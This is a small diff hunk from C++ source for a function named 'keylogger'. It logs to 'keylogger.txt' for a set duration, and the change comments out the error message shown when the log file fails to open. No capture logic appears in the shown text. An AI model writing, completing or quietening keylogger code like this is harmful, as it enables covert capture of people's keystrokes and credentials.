@@ -18,8 +18,8 @@ bool isKeyLoggingTimeExpired(time_t startTime, int durationInSeconds) {
 void keylogger(int durationInSeconds) {
     std::ofstream logFile;
     logFile.open("keylogger.txt", std::ios:: out);
-    if (!logFile.is_open()) 
-        std::cout << "Can not open logFile." << std::endl;
+    // if (!logFile.is_open()) 
+    //     std::cout << "Can not open logFile." << std::endl;
     logFile.close();
     time_t startTime = time(NULL);
     while (!isKeyLoggingTimeExpired(startTime, durationInSeconds)) {
